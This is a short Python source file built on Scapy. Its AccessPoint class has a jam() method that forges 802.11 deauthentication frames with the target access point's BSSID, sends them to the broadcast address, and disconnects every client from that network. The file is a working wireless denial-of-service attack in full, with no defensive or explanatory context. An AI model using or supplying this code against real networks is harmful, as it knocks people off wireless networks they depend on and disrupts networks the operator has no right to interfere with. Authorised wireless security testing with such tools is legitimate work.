#!/bin/python3
from scapy.volatile import RandMAC
from scapy.sendrecv import sendp
from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap

import logging
logger = logging.getLogger(__name__)

class AccessPoint():
	def __init__(self, essid, bssid, channel):
		self.essid = essid
		self.bssid = bssid
		self.channel = channel

	def jam(self, interface):
		logging.info('De-Authenticating All Clients on ' + self.essid)
		DeAuth_Frame = RadioTap()/Dot11(addr1 = "FF:FF:FF:FF:FF:FF", addr2 = self.bssid, addr3 = self.bssid)/Dot11Deauth()
		sendp(DeAuth_Frame, verbose=False, count=5, iface=interface)